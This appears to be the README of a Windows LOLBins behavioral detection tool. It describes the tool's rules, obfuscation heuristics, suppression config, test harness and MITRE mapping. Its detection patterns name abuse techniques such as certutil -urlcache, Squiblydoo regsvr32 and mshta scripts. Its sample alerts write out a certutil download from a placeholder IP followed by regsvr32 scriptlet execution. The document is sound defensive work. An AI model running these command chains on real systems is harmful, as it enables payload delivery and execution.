# Behavioral Living-off-the-Land (LOLBins) Detection System

An enterprise-grade, host-based behavioral detection engine built in Python 3.12 for identifying Living-off-the-Land Binaries, Scripts, and Libraries (LOLBins) on Microsoft Windows endpoints.

---

## Table of Contents

- [Overview](#overview)
- [Why Behavioral LOLBins Detection Matters](#why-behavioral-lolbins-detection-matters)
- [System Architecture](#system-architecture)
- [Supported LOLBins & Primitives](#supported-lolbins--primitives)
- [Detection Capabilities](#detection-capabilities)
  - [Single-Event Rules](#1-single-event-behavioral-rules)
  - [Sequential Multi-Event Attack Chains](#2-sequential-multi-event-attack-chains)
  - [Binary Masquerading & Renamed LOLBins](#3-binary-masquerading--renamed-lolbins)
  - [Parent PID (PPID) Spoofing Anomaly Detection](#4-parent-pid-ppid-spoofing-anomaly-detection)
  - [Command-Line Obfuscation Heuristics](#5-command-line-obfuscation-heuristics)
- [Suppression & De-duplication Engine](#suppression--de-duplication-engine)
- [Installation & Quick Start](#installation--quick-start)
- [Operational Modes](#operational-modes)
- [Interactive SOC Web Dashboard](#interactive-soc-web-dashboard)
- [Automated Threat Emulation Test Harness](#automated-threat-emulation-test-harness)
- [Alerting & Timeline Reconstruction](#alerting--timeline-reconstruction)
  - [Console Triage View](#1-console-triage-view)
  - [JSON & SIEM Integration](#2-json--siem-integration)
  - [Webhook Forwarding (Slack / Discord / SIEM)](#3-webhook-forwarding-slack--discord--siem)
  - [Markdown SOC Incident Reports](#4-markdown-soc-incident-reports)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Extending the Engine](#extending-the-engine)
- [Limitations & Future Roadmap](#limitations--future-roadmap)
- [License](#license)

---

## Overview

Modern adversaries and post-exploitation frameworks increasingly evade traditional signature-based antivirus and Endpoint Detection and Response (EDR) solutions by abusing legitimate, digitally signed operating system utilities. This adversary tradecraft—commonly termed **Living-off-the-Land (LotL)**—allows attackers to execute code, download stages, bypass application whitelisting, and perform lateral movement without dropping custom binaries on disk.

**lolbins-detector** is a modular, standalone behavioral detection framework designed to detect anomalous utility invocations, renamed binaries, and multi-stage attack sequences in real time. It pairs high-fidelity process telemetry collection (preferring **Sysmon Event ID 1** with automatic **psutil** fallback) with an in-memory **correlation state machine**, temporal event reconstruction (± 5–10 minutes), false positive suppression, an interactive SOC web dashboard, and automated incident reporting.

---

## Why Behavioral LOLBins Detection Matters

Relying solely on static indicators of compromise (such as binary file hashes or standard image paths) is fundamentally ineffective against LOLBins:

1. **Legitimate Signatures**: LOLBins (`certutil.exe`, `mshta.exe`, `regsvr32.exe`, `rundll32.exe`) are Microsoft-signed system binaries located in standard Windows directories (`System32`, `SysWOW64`).
2. **Dual-Use Functionality**: Native utilities possess administrative capabilities (e.g., certificate verification, BITS job management) that adversaries repurpose for ingress tool transfer and proxy execution.
3. **Multi-Stage Chains**: Sophisticated threat actors decouple operations across multiple hops—using one utility to download a remote payload, a second to decode it, and a third to proxy execution. Single-event detection misses the broader operational context.
4. **Command-Line Evasion**: Adversaries leverage command-line obfuscation (caret/backtick escaping, environment variable slicing, Base64 encoding) to evade rigid string-matching signatures.
5. **Binary Masquerading**: Attackers copy native utilities to arbitrary directories under disguised names (e.g., `update.exe` or `svchost.exe`). Checking file names alone is bypassed trivially.

**lolbins-detector** counters these tactics by focusing on **behavioral characteristics**, **PE OriginalFileName metadata**, **process tree lineage**, and **temporal sequence correlation**.

---

## System Architecture

The engine employs a decoupled, pipeline-driven architecture separating telemetry collection, correlation state tracking, rule evaluation, and artifact dispatch.

```
                         Windows Endpoint Telemetry
                                    │
           ┌────────────────────────┴────────────────────────┐
           ▼                                                 ▼
┌───────────────────────────┐                     ┌───────────────────────────┐
│     Sysmon Collector      │                     │     psutil Collector      │
│  WinEventLog: Channel     │                     │  Active PID Diff Polling  │
│  Sysmon Operational ID 1  │                     │  Win32 Token Integrity &  │
│  OriginalFileName & Hashes│                     │  PE Header Metadata       │
└─────────────┬─────────────┘                     └─────────────┬─────────────┘
              │ (Preferred)                                     │ (Fallback)
              └─────────────────────┬───────────────────────────┘
                                    │ ProcessEvent Stream
                                    ▼
                      ┌───────────────────────────┐
                      │    ProcessCollector       │
                      │  Orchestrator & Ingestion │
                      └─────────────┬─────────────┘
                                    │
         ┌──────────────────────────┼──────────────────────────┐
         ▼                          ▼                          ▼
┌─────────────────┐       ┌───────────────────┐      ┌────────────────────────┐
│  SQLite Store   │       │   Correlation     │      │   Detection Engine     │
│  WAL Mode DB    │       │   State Machine   │      │ • Single-Event Rules   │
│  Event Archive  │       │ (Sliding Window:  │      │ • Sequential Chains    │
└────────┬────────┘       │   5–10 minutes)   │      │ • PE Masquerading      │
         │                └─────────┬─────────┘      │ • PPID Spoofing Checks │
         │                          │                │ • Suppression Engine   │
         │                          │                └─────────┬──────────────┘
         │                          └───────────┬──────────────┘
         │                                      │ Triggered Alert
         │                                      ▼
         │                        ┌───────────────────────────┐
         │                        │  Timeline Reconstructor   │
         │                        │ (± 5-10m Temporal Context │
         │                        │ & Process Ancestry Tree)  │
         │                        └─────────────┬─────────────┘
         │                                      │
         └──────────────────────────────────────┤ Enriched Incident
                                                ▼
                                  ┌───────────────────────────┐
                                  │     Alert Dispatcher      │
                                  └─────────────┬─────────────┘
                                                │
                 ┌──────────────────────────────┼──────────────────────────────┐
                 ▼                              ▼                              ▼
      ┌────────────────────┐         ┌────────────────────┐         ┌────────────────────┐
      │   Console Triage   │         │    JSON & SIEM     │         │   Markdown Report  │
      │ ANSI Color Banners │         │ alerts.jsonl,      │         │ Full SOC Incident  │
      │ Process Tree View  │         │ incident_<id>.json,│         │ Response Playbook  │
      │ Live Web Dashboard │         │ Slack/Discord Hook │         │                    │
      └────────────────────┘         └────────────────────┘         └────────────────────┘
```

---

## Supported LOLBins & Primitives

The engine provides specialized behavioral detection logic for high-risk Windows utilities:

| Binary | Standard Binary Path | Monitored Adversary Techniques |
| :--- | :--- | :--- |
| **`certutil.exe`** | `%SystemRoot%\System32\certutil.exe` | Ingress tool download (`-urlcache`), base64 decoding (`-decode`, `-decodehex`), file splitting |
| **`bitsadmin.exe`** | `%SystemRoot%\System32\bitsadmin.exe` | Background transfer jobs (`/transfer`, `/addfile`), persistence triggers (`/setnotifycmdline`) |
| **`mshta.exe`** | `%SystemRoot%\System32\mshta.exe` | Inline script protocols (`javascript:`, `vbscript:`, `about:`), remote `.hta` execution |
| **`regsvr32.exe`** | `%SystemRoot%\System32\regsvr32.exe` | Squiblydoo COM scriptlet execution (`scrobj.dll`), remote URL fetches (`/i:http:`, `/i:https:`) |
| **`rundll32.exe`** | `%SystemRoot%\System32\rundll32.exe` | Inline script execution (`mshtml,RunHTMLApplication`), proxy DLL loading, Advpack execution |
| **`powershell.exe`** | `%SystemRoot%\System32\WindowsPowerShell\v1.0\` | Encoded command execution (`-enc`), hidden windows, web download cradles |
| **`wmic.exe`** | `%SystemRoot%\System32\wbem\wmic.exe` | Process invocation (`process call create`), remote XSL execution (`/format:http`) |
| **`cmd.exe`** | `%SystemRoot%\System32\cmd.exe` | Intermediate shell cascades, argument obfuscation (`^`, `%var:~0,1%`) |
| **`cscript.exe` / `wscript.exe`**| `%SystemRoot%\System32\` | Unattended VBScript/JScript staging, dropped script payload execution |

---

## Detection Capabilities

### 1. Single-Event Behavioral Rules

Defined declaratively in [`rules/definitions/core_lolbins.yaml`](file:///d:/projects/Behavioral%20Living-off-the-Land%20(LOLBins)%20Detection%20System/rules/definitions/core_lolbins.yaml):

- **`LOLBIN-001` (Critical)**: **Office Application Spawning LOLBin Utilities**  
  Detects Microsoft Office processes (`winword.exe`, `excel.exe`, `powerpnt.exe`, `outlook.exe`) spawning native LOLBins (`mshta`, `regsvr32`, `certutil`, `rundll32`, `bitsadmin`).
- **`LOLBIN-002` (High)**: **Suspicious Certutil Ingress Transfer or Payload Decode**  
  Detects `certutil.exe` invoked with remote download parameters (`-urlcache`, `/urlcache`), file splits, or decode switches (`-decode`, `-decodehex`).
- **`LOLBIN-003` (High)**: **Suspicious Bitsadmin Remote File Transfer**  
  Detects `bitsadmin.exe` used to create or execute file transfer jobs targeting external HTTP/HTTPS resources.
- **`LOLBIN-004` (Critical)**: **Mshta Inline Script Execution or Remote HTA Execution**  
  Detects `mshta.exe` executing inline `javascript:` / `vbscript:` payloads or accessing external `.hta` scripts.
- **`LOLBIN-005` (Critical)**: **Regsvr32 Proxy Execution Patterns (Squiblydoo)**  
  Detects `regsvr32.exe` loading remote COM scriptlets (`scrobj.dll`) or remote URLs via `/i:http:`.
- **`LOLBIN-006` (High)**: **PowerShell Encoded or Hidden Download Cradle**  
  Detects PowerShell executing encoded Base64 commands, hidden window styles, or web client download strings.

### 2. Sequential Multi-Event Attack Chains

Defined in [`rules/definitions/sequential_lolbins.yaml`](file:///d:/projects/Behavioral%20Living-off-the-Land%20(LOLBins)%20Detection%20System/rules/definitions/sequential_lolbins.yaml) and [`rules/python_rules/chain_rules.py`](file:///d:/projects/Behavioral%20Living-off-the-Land%20(LOLBins)%20Detection%20System/rules/python_rules/chain_rules.py):

- **`SEQ-CHAIN-001` (Critical)**: **Download Then Execute Chain**  
  Tracks an ingress tool transfer (`certutil`, `bitsadmin`, or `powershell`) followed by the execution of a newly staged binary or script runner under the same user session within 5 minutes.
- **`SEQ-CHAIN-002` (Critical)**: **Encoded PowerShell Following LOLBin Activity**  
  Tracks initial utility execution (`certutil`, `bitsadmin`, `mshta`, `regsvr32`, etc.) followed by obfuscated/encoded PowerShell commands within 3 minutes under the same user session.
- **`SEQ-CHAIN-003` (High)**: **Cascading Process Tree (`cmd.exe` → `powershell.exe` → LOLBin)**  
  Correlates multi-hop process tree progression where `cmd.exe` spawns `powershell.exe`, which subsequently spawns a downstream LOLBin within 3 minutes along the same process hierarchy.

### 3. Binary Masquerading & Renamed LOLBins

- **`MASQ-001` (Critical)**: **Masquerading: Renamed LOLBin Executable Invocation (`T1036.003`)**  
  Inspects the binary's internal PE `OriginalFileName` header (via Sysmon or Windows version APIs). If the internal PE metadata indicates a known LOLBin (e.g. `CertUtil.exe`, `mshta.exe`) but the executing file has been renamed (e.g. `updater.exe` or `svchost.exe`), the engine flags the evasion immediately.

### 4. Parent PID (PPID) Spoofing Anomaly Detection

- **`PPID-ANOMALY-001` (High)**: **Suspicious Parent Process Spoofing Anomaly (`T1134.004`)**  
  Identifies process tree tampering where an unprivileged, interactive user process claims critical core system services (`lsass.exe`, `smss.exe`, `services.exe`) as its parent while running with non-system user credentials or medium/low integrity levels.

### 5. Command-Line Obfuscation Heuristics

The engine automatically evaluates all LOLBin command lines against regex heuristics targeting:
- **Excessive Caret (`^`) Escaping**: Detects attempts to disrupt static string matching via cmd escaping (e.g., `c^m^d^.^e^x^e`).
- **Excessive Backtick (`` ` ``) Escaping**: Detects PowerShell string fragmenting (e.g., `d`o`w`n`l`o`a`d`).
- **Base64 Payload Blocks**: Detects continuous Base64 blocks exceeding 60 characters without standard file paths.
- **Environment Variable Slicing**: Identifies command lines abusing `%var:~0,1%` variable expansion.

---

## Suppression & De-duplication Engine

To eliminate alert fatigue in production SOC environments, `lolbins-detector` features a built-in suppression and de-duplication engine:

- **Whitelisting Rules**: Configure granular suppression rules in `config.yaml` matching by rule ID, username, command-line regex, or parent image:
  ```yaml
  suppression:
    enabled: true
    cooldown_seconds: 300.0
    rules:
      - rule_id: "LOLBIN-003"
        user: "NT AUTHORITY\\SYSTEM"
        command_line_regex: "(?i)windowsupdate"
        reason: "Legitimate Windows Update BITS transfer job"
  ```
- **Alert De-duplication**: Repeated identical alerts (same rule, user, and command line) within the cooldown window (default 5 minutes) are collapsed into a single notification with an aggregated hit count (`alert_hit_count`).

---

## Installation & Quick Start

### Prerequisites

- **Windows 10 / 11 / Server 2016+**
- **Python 3.12+**
- (Optional, Recommended) **Microsoft Sysmon** installed and running with operational logging enabled.

### 1. Clone & Set Up Virtual Environment

```bash
git clone https://github.com/example-org/lolbins-detector.git
cd lolbins-detector

python -m venv venv
venv\Scripts\activate
```

### 2. Install Dependencies

```bash
pip install -r requirements.txt
```

*Key dependencies: `PyYAML>=6.0.1`, `psutil>=5.9.8`, `pywin32>=306` (Windows), `rich>=13.7.0`.*

### 3. Run Automated Threat Simulation Test Harness

Validate the entire detection pipeline, rule matching, masquerading checks, attack chains, and suppression with the built-in test suite:

```bash
python main.py --test
```

---

## Operational Modes

### Live Real-Time Monitoring

Start the engine with automatic telemetry selection (prefers Sysmon Event ID 1; falls back to psutil polling):

```bash
python main.py
```

### Force Telemetry Source

```bash
# Force Sysmon Event ID 1 subscription
python main.py --mode sysmon

# Force cross-compatible psutil polling
python main.py --mode psutil_polling

# Run simulated mock events for test verification
python main.py --mode mock
```

### Database Inspection

Query total recorded process events and security alerts in SQLite:

```bash
python main.py --stats
```

---

## Interactive SOC Web Dashboard

Launch the zero-dependency, local SOC analyst web dashboard:

```bash
python main.py --dashboard
# or directly:
python dashboard.py
```

Open `http://127.0.0.1:8080/` in any browser to access:
- **KPI Metrics**: Total Events, Total Alerts, Critical Count, High Count.
- **Searchable Live Alert Table**: Filter by rule ID, process, user, command line, or severity.
- **Detailed Triage Drawer**:
  - Full execution context and command lines.
  - Process lineage ancestry tree.
  - MITRE ATT&CK technique tags.
  - SOC response playbook (process termination, staging path inspection, network isolation).

---

## Automated Threat Emulation Test Harness

Run the automated validation suite to benchmark detection accuracy across all scenarios:

```bash
python test_harness.py
```

Sample output:
```text
================================================================================
  LOLBins Detection System - Threat Simulation & Validation Harness
================================================================================

ID           | Status   | Latency  | Description
--------------------------------------------------------------------------------
LOLBIN-001   | PASS     |   0.8ms  | Office App Spawning LOLBin (Word -> Certutil)
LOLBIN-002   | PASS     |   0.4ms  | Suspicious Certutil Ingress Remote Download
LOLBIN-003   | PASS     |   0.3ms  | Bitsadmin Remote File Transfer Job
LOLBIN-004   | PASS     |   0.3ms  | Mshta Inline JavaScript Protocol Execution
LOLBIN-005   | PASS     |   0.3ms  | Regsvr32 Squiblydoo COM Scriptlet Proxy
MASQ-001     | PASS     |   0.2ms  | Binary Masquerading (CertUtil Renamed to updater.exe)
PPID-001     | PASS     |   0.2ms  | Parent PID Spoofing Anomaly (Claims lsass.exe Parent)
SEQ-001      | PASS     |   0.5ms  | Sequential Chain: Download Cradle -> Staged Execution
SEQ-002      | PASS     |   0.4ms  | Sequential Chain: LOLBin Activity -> Encoded PowerShell
SEQ-003      | PASS     |   0.6ms  | Sequential Chain: Process Cascade (cmd -> pwsh -> mshta)
SUPPRESS     | PASS     |   0.2ms  | False Positive Suppression (Whitelisted BITS Job)
--------------------------------------------------------------------------------

Test Summary: 11/11 Passed (100.0%), 0 Failed.
```

---

## Alerting & Timeline Reconstruction

Whenever a detection rule triggers, the engine gathers all events occurring within **± 5–10 minutes**, resolves the process lineage tree, and dispatches the alert across multiple channels.

### 1. Console Triage View

Formatted, color-coded ANSI banner with integrated event timeline:

```text
══════════════════════════════════════════════════════════════════════════════
 [ALERT: CRITICAL] SEQ-CHAIN-001 - Attack Chain: LOLBin Download Cradle Followed by Payload Execution
══════════════════════════════════════════════════════════════════════════════
  Alert ID        : 7b84f3c0-3b2e-4b61-9c87-2f12a3d4e5f6
  Timestamp (UTC) : 2026-11-01T04:47:28Z
  MITRE ATT&CK    : T1105, T1204.002, T1218, T1059
  Trigger Process : C:\Windows\System32\regsvr32.exe (PID: 6900, PPID: 3912)
  Parent Process  : C:\Windows\System32\cmd.exe
  Command Line    : regsvr32.exe /s /n /u /i:C:\ProgramData\update.sct scrobj.dll
  Security User   : WORKSTATION\StandardUser (Medium integrity)
  Indicators      : stage_1:Ingress Download Cradle, stage_2:Dropped Payload or Proxy Execution
  Sequence Chain  : Correlated in 0.01s (Key: user:WORKSTATION\STANDARDUSER)
  Process Lineage :
    cmd.exe (PID: 3912)
    └── regsvr32.exe (PID: 6900) [TRIGGER]
  Timeline (± 5-10m Window: 2 correlated events):
        -00m 00s   | [SAME_USER] | PID 6832  | certutil.exe    | certutil.exe -urlcache -split -f http://198.51.100.42/payload.bin...
    >>> TRIGGER    | [TRIGGER]   | PID 6900  | regsvr32.exe    | regsvr32.exe /s /n /u /i:C:\ProgramData\update.sct scrobj.dll
──────────────────────────────────────────────────────────────────────────────
```

### 2. JSON & SIEM Integration

Enriched events are appended to `data/alerts.jsonl` and emitted as individual incident JSON files under `data/alerts/incidents/incident_<rule_id>_<id>.json`:

```json
{
  "alert_id": "7b84f3c0-3b2e-4b61-9c87-2f12a3d4e5f6",
  "rule_id": "SEQ-CHAIN-001",
  "rule_name": "Attack Chain: LOLBin Download Cradle Followed by Payload Execution",
  "severity": "critical",
  "description": "Detects a network ingress transfer via certutil, bitsadmin, or PowerShell download cradles followed by the execution of a newly staged payload...",
  "mitre_attack": ["T1105", "T1204.002", "T1218", "T1059"],
  "event": {
    "pid": 6900,
    "ppid": 3912,
    "image": "C:\\Windows\\System32\\regsvr32.exe",
    "command_line": "regsvr32.exe /s /n /u /i:C:\\ProgramData\\update.sct scrobj.dll",
    "user": "WORKSTATION\\StandardUser",
    "parent_image": "C:\\Windows\\System32\\cmd.exe",
    "integrity_level": "Medium",
    "creation_time": "2026-11-01T04:47:28Z"
  },
  "timeline_reconstruction": {
    "window_seconds": 300.0,
    "total_correlated_events": 2,
    "events": [
      {
        "delta_seconds": 0.0,
        "delta_display": "-00m 00s",
        "relationship": "SAME_USER",
        "pid": 6832,
        "image": "certutil.exe",
        "command_line": "certutil.exe -urlcache -split -f http://198.51.100.42/payload.bin C:\\ProgramData\\update.sct"
      },
      {
        "delta_seconds": 0.0,
        "delta_display": "TRIGGER",
        "relationship": "TRIGGER",
        "pid": 6900,
        "image": "regsvr32.exe",
        "command_line": "regsvr32.exe /s /n /u /i:C:\\ProgramData\\update.sct scrobj.dll"
      }
    ]
  }
}
```

### 3. Webhook Forwarding (Slack / Discord / SIEM)

Configure the webhook block in `config.yaml` to automatically forward alerts to your incident channel or SIEM endpoint:

```yaml
output:
  webhook:
    enabled: true
    url: "https://hooks.slack.com/services/T000/B000/XXXX"
    type: "slack"  # "generic", "slack", or "discord"
```

### 4. Markdown SOC Incident Reports

Automated reports are written to `reports/incident_<rule_id>_<id>.md`. Each report includes:
- **Triage Metadata Table** with severity badge and MITRE technique tags
- **Execution Context Table** (target binary, PID, PPID, parent executable, account, integrity level)
- **Fenced Command Line** invocation
- **Behavioral Indicators** list
- **ASCII Process Lineage Tree**
- **Correlated Event Timeline Table** with relative offsets (`-02m 14s`, `TRIGGER`, `+00m 10s`)
- **SOC Analyst Response Playbook** detailing process containment, memory preservation, and staging path auditing

---

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic | Covered Utilities / Rules |
| :--- | :--- | :--- | :--- |
| **`T1204.002`** | User Execution: Malicious File | Execution | `winword.exe`, `excel.exe`, `powerpnt.exe`, `outlook.exe` (`LOLBIN-001`) |
| **`T1059.001`** | Command & Scripting: PowerShell | Execution | `powershell.exe`, `pwsh.exe` (`LOLBIN-002`, `LOLBIN-006`, `SEQ-CHAIN-002`) |
| **`T1059.003`** | Command & Scripting: Windows Command Shell | Execution | `cmd.exe` (`SEQ-CHAIN-003`) |
| **`T1218.005`** | System Binary Proxy Execution: Mshta | Defense Evasion | `mshta.exe` (`LOLBIN-004`, `SEQ-CHAIN-001`, `SEQ-CHAIN-003`) |
| **`T1218.010`** | System Binary Proxy Execution: Regsvr32 | Defense Evasion | `regsvr32.exe` (`LOLBIN-005`, `SEQ-CHAIN-001`) |
| **`T1218.011`** | System Binary Proxy Execution: Rundll32 | Defense Evasion | `rundll32.exe` (`LOLBIN-007`) |
| **`T1036.003`** | Masquerading: Rename System Utilities | Defense Evasion | Renamed LOLBin binaries (`MASQ-001`) |
| **`T1134.004`** | Access Token Manipulation: Parent PID Spoofing | Privilege Escalation, Defense Evasion | Spoofed process lineage (`PPID-ANOMALY-001`) |
| **`T1105`** | Ingress Tool Transfer | Command and Control | `certutil.exe`, `bitsadmin.exe`, `powershell.exe` (`LOLBIN-002`, `LOLBIN-003`, `SEQ-CHAIN-001`) |
| **`T1140`** | Deobfuscate/Decode Files or Information | Defense Evasion | `certutil.exe` (`LOLBIN-002`) |
| **`T1197`** | BITS Jobs | Persistence, Defense Evasion | `bitsadmin.exe` (`LOLBIN-003`) |
| **`T1047`** | Windows Management Instrumentation | Execution | `wmic.exe` (`LOLBIN-008`) |
| **`T1027`** | Obfuscated Files or Information | Defense Evasion | Generic Caret, Backtick, Base64 Heuristics (`HEURISTIC-OBF-001`) |

---

## Extending the Engine

### Adding a Declarative Rule in YAML

Create a new `.yaml` file under `rules/definitions/`:

```yaml
rules:
  - id: "CUSTOM-001"
    name: "InstallUtil Proxy Execution"
    description: "Detects InstallUtil.exe executing uninstall methods to bypass AppLocker."
    severity: "high"
    mitre_attack:
      - "T1218.004"
    detection:
      target_images:
        - "installutil.exe"
      command_line_contains_any:
        - "/u"
        - "-u"
        - "/logfile="
```

### Adding an Object-Oriented Rule in Python

Create a `.py` file under `rules/python_rules/`:

```python
from engine.sequential import SequenceStage, SequentialRule
from utils.models import Severity

class CustomCradleToDumpRule(SequentialRule):
    def __init__(self) -> None:
        stages = [
            SequenceStage(
                name="Stage 1: Reconnaissance",
                target_images=["whoami.exe", "net.exe"],
            ),
            SequenceStage(
                name="Stage 2: LOLBin Invocation",
                target_images=["certutil.exe", "mshta.exe"],
            ),
        ]
        super().__init__(
            rule_id="PY-CUSTOM-001",
            name="Reconnaissance Followed by LOLBin Execution",
            description="Detects rapid discovery followed by living-off-the-land invocation.",
            severity=Severity.HIGH,
            stages=stages,
            correlation_key_type="user",
            within_seconds=180.0,
        )

RULES = [CustomCradleToDumpRule()]
```

---

## Limitations & Future Roadmap

### Current Limitations

- **Polling Latency in psutil Mode**: In systems without Sysmon, `psutil` polling at a 1.0s interval may miss ultra-ephemeral processes that spawn and terminate in under 100 milliseconds.
- **Kernel-Level Evasion**: User-mode collectors cannot detect direct syscall execution or process unhooking.

### Roadmap

- [x] **Sysmon OriginalFileName & Hashes Ingestion**: Integrated into `ProcessEvent` and detection engine.
- [x] **Binary Masquerading Detection**: PE metadata cross-checking (`MASQ-001`).
- [x] **Parent PID (PPID) Spoofing Anomaly Checks**: System parent credential mismatch analysis (`PPID-ANOMALY-001`).
- [x] **False Positive Suppression & De-duplication Engine**: Integrated whitelisting and cooldown windows.
- [x] **SIEM & Incident Webhooks**: Slack, Discord, and generic SIEM JSON webhooks.
- [x] **Interactive SOC Web Dashboard**: Zero-dependency real-time triage UI (`dashboard.py`).
- [x] **Automated Threat Emulation Test Harness**: CI/CD-ready validation runner (`test_harness.py`).
- [ ] **Windows ETW (Event Tracing for Windows)**: Implement native kernel-level ETW consumer for `Microsoft-Windows-Kernel-Process`.
- [ ] **Automated Sigma Rule Transpiler**: Convert open-source Sigma rules directly into engine detection rules.

---

## License

This project is licensed under the Apache 2.0 License. See `LICENSE` for details.
